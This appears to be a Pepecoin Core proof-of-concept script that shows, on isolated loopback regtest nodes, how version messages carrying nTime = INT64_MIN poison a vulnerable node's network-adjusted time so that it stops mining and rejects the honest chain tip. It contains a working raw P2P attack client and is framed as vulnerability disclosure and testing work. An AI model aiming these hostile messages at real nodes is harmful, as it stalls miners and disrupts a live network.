#!/usr/bin/env python3
# Copyright (c) 2024 The Pepecoin Core developers
# Distributed under the MIT software license.
#
# ISOLATED-REGTEST demonstration for PEP-001:
#   Does poisoning an UNMODIFIED Pepecoin mining node's network-adjusted time
#   actually stop it from extending the honest tip?
#
# Setup: two loopback regtest nodes.
#   - VICTIM  = the vulnerable (pre-fix, abs64) binary, acting as a miner.
#   - HONEST  = a normal node/miner that builds the real chain.
# The victim is poisoned with 8 `version` messages (nTime = INT64_MIN + second)
# from distinct loopback source IPs, then we test TWO things directly:
#   A) can the poisoned victim PRODUCE a block?          (generatetoaddress)
#   B) does the poisoned victim ACCEPT the honest tip?   (submitblock)
#
# Binaries: set VULN_BIN / FIXED_BIN, or place pepecoind-vuln / pepecoind-fixed
# in the scratchpad path below.  Loopback only; touches nothing external.

import hashlib, json, os, socket, struct, subprocess, sys, time

SCR = "/tmp/claude-0/-home-user-pepecoin/6d56737e-8d21-5257-be8e-9c4dcb1ae824/scratchpad"
VULN_BIN = os.environ.get("VULN_BIN", os.path.join(SCR, "pepecoind-vuln"))
FIXED_BIN = os.environ.get("FIXED_BIN", os.path.join(SCR, "pepecoind-fixed"))
CLI = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "src", "pepecoin-cli"))
WORK = os.environ.get("TW_DIR", "/tmp/tw_demo")
INT64_MIN = -(2 ** 63)
MAGIC = b"\xfa\xbf\xb5\xda"

VICTIM = {"name": "victim", "rpc": 23001, "p2p": 23002, "bin": VULN_BIN}
HONEST = {"name": "honest", "rpc": 23011, "p2p": 23012, "bin": FIXED_BIN}


# ---- tiny raw-socket P2P client that sends one hostile version --------------
def dsha(b): return hashlib.sha256(hashlib.sha256(b).digest()).digest()
def msg(cmd, p): return MAGIC + cmd.encode().ljust(12, b"\0") + struct.pack("<I", len(p)) + dsha(p)[:4] + p
def netaddr(ip, port): return struct.pack("<Q", 1) + b"\x00"*10 + b"\xff\xff" + socket.inet_aton(ip) + struct.pack(">H", port)

def version_payload(evil_time, dstport):
    p  = struct.pack("<i", 70015) + struct.pack("<Q", 1) + struct.pack("<q", evil_time)
    p += netaddr("127.0.0.1", dstport) + netaddr("0.0.0.0", 0) + struct.pack("<Q", 0x1122)
    ua = b"/tw/"; p += struct.pack("<B", len(ua)) + ua + struct.pack("<i", 0) + struct.pack("<B", 0)
    return p

def hostile(src_ip, dstport, evil_time):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((src_ip, 0)); s.settimeout(5); s.connect(("127.0.0.1", dstport))
    s.sendall(msg("version", version_payload(evil_time, dstport)))
    try: s.recv(4096); s.sendall(msg("verack", b"")); s.recv(4096)
    except socket.timeout: pass
    return s

def poison(dstport, n=8):
    time.sleep((1.0 - time.time() % 1.0) + 0.05)
    et = INT64_MIN + int(time.time())
    conns = [hostile("127.0.0.%d" % (2+i), dstport, et) for i in range(n)]
    time.sleep(2)
    for s in conns:
        try: s.close()
        except OSError: pass


# ---- node helpers ----------------------------------------------------------
def conf(node):
    d = os.path.join(WORK, node["name"]); os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "pepecoin.conf"), "w").write(
        "regtest=1\nserver=1\nlisten=1\nbind=127.0.0.1\ndiscover=0\n"
        "rpcuser=u\nrpcpassword=p\nrpcport=%d\nport=%d\nmaxconnections=200\n" % (node["rpc"], node["p2p"]))
    return d

def cli(node, *a):
    d = os.path.join(WORK, node["name"])
    r = subprocess.run([CLI, "-datadir=%s" % d, "-rpcport=%d" % node["rpc"], "-rpcuser=u", "-rpcpassword=p"]
                       + [str(x) for x in a], capture_output=True, text=True)
    return r.returncode, r.stdout.strip(), r.stderr.strip()

def start(node):
    subprocess.run([node["bin"], "-datadir=%s" % conf(node), "-daemon"], capture_output=True)

def wait(node):
    for _ in range(30):
        if cli(node, "getblockcount")[0] == 0: return
        time.sleep(1)
    raise SystemExit("%s never came up" % node["name"])

def height(node): return int(cli(node, "getblockcount")[1] or -1)
def offset(node):
    _, o, _ = cli(node, "getnetworkinfo")
    return json.loads(o)["timeoffset"] if o else None


def main():
    for b in (VULN_BIN, FIXED_BIN):
        if not os.path.exists(b): raise SystemExit("missing binary: %s" % b)
    if os.path.exists(WORK): subprocess.run(["rm", "-rf", WORK])
    os.makedirs(WORK)

    start(VICTIM); start(HONEST); wait(VICTIM); wait(HONEST)
    addrH = cli(HONEST, "getnewaddress")[1]

    # Honest builds a 6-block chain; victim syncs over p2p.
    cli(HONEST, "addnode", "127.0.0.1:%d" % VICTIM["p2p"], "onetry")
    time.sleep(2)
    cli(HONEST, "generatetoaddress", 6, addrH); time.sleep(3)
    print("PRE-ATTACK : victim height=%d offset=%s | honest height=%d"
          % (height(VICTIM), offset(VICTIM), height(HONEST)))

    # Partition, then poison the victim.
    cli(HONEST, "disconnectnode", "127.0.0.1:%d" % VICTIM["p2p"])
    cli(HONEST, "setban", "127.0.0.1", "add", 3600); cli(VICTIM, "setban", "127.0.0.1", "add", 3600)
    for _ in range(6):
        poison(VICTIM["p2p"], 8)
        if offset(VICTIM) not in (0, None): break
    print("POISONED   : victim offset=%s  (INT64_MIN = %d)" % (offset(VICTIM), INT64_MIN))

    print("\n== A) can the poisoned victim PRODUCE a block? (its mining path) ==")
    rc, out, err = cli(VICTIM, "generatetoaddress", 1, cli(VICTIM, "getnewaddress")[1])
    print("   generatetoaddress ->", (err or out).splitlines()[0] if (err or out) else "(ok)")
    print("   victim height after mine attempt:", height(VICTIM), "(unchanged => cannot mine)")

    print("\n== B) does the poisoned victim ACCEPT the honest tip's next block? ==")
    cli(HONEST, "generatetoaddress", 1, addrH)
    h7 = cli(HONEST, "getblockhash", 7)[1]
    hexblk = cli(HONEST, "getblock", h7, 0)[1]
    print("   honest mined block 7 =", h7[:24], "(honest height=%d)" % height(HONEST))
    rc, out, err = cli(VICTIM, "submitblock", hexblk)
    print("   victim submitblock ->", (out or err or "null(accepted!)"))
    print("   victim height after receiving honest block:", height(VICTIM),
          "(still 6 => REJECTED the honest tip)")

    dbg = os.path.join(WORK, "victim", "regtest", "debug.log")
    hits = [l for l in open(dbg).read().splitlines() if "time-too-new" in l][-2:] if os.path.exists(dbg) else []
    print("\n== victim debug.log cause ==")
    for l in hits: print("  ", l)

    print("\nVERDICT: a poisoned unmodified mining node NEITHER produces a block NOR")
    print("         accepts the honest tip -> it stops extending the honest chain.")
    cli(VICTIM, "stop"); cli(HONEST, "stop"); time.sleep(2)


if __name__ == "__main__":
    main()
